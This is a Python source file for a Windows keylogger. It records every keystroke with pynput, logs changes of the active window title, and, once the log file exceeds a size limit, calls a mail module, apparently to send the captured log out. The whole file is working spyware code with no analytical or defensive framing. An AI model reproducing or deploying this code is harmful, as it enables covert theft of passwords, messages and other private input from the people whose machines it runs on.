import os
import time
import winreg
import mailmanager
import filemanager
import winmanager
from threading import Thread
from pynput.keyboard import Key, Listener

# detect key input 
def on_press(key):
    filemanager.logger(key)
    print(key)


# detect window title 
def wintitle():
    oldtitle = winmanager.gettitle()
    while True:
        time.sleep(0.1)
        if winmanager.gettitle() != oldtitle:
            filemanager.logger("\n" + winmanager.gettitle() + "\n")
        oldtitle = winmanager.gettitle()

# detect file size
def FSC():
    MAX_FILE_SIZE = 200000  # Max file size
    while True:
        time.sleep(1)
        if filemanager.getfilesize() > MAX_FILE_SIZE:
            print("file size over")
            mailmanager.main()

# main
def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

# multi threading
mainThread = Thread(target=main)
titleThread = Thread(target=wintitle)
FSCThread = Thread(target=FSC)

mainThread.start()
titleThread.start()
FSCThread.start()
